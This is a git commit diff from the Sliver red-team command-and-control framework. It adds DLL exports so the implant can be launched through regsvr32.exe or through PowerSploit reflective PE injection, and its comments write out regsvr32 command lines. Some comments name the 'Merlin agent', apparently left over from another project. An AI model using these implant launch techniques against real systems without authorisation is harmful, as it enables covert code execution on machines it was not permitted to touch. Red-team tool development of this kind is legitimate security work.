15da99c98ffc989494347a5a62131ca0c3835b5e
rkervella <rkervella@bishopfox.com>
2019-11-13 19:06:45 +0100

    Add exports to support regsvr32

--- sliver/sliver.go
+++ sliver/sliver.go
@@ -59,6 +59,26 @@ func RunSliver(
 	main()
 }
 
+// VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
+//export VoidFunc
+func VoidFunc() { main() }
+
+// DllInstall is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s /n /i sliver.dll)
+// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
+//export DllInstall
+func DllInstall() { main() }
+
+// DLLRegisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
+// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
+//export DllRegisterServer
+func DllRegisterServer() { main() }
+
+// DLLUnregisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
+// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
+//export DllUnregisterServer
+func DllUnregisterServer() { main() }
+
+
 // {{end}}
 
 func main() {
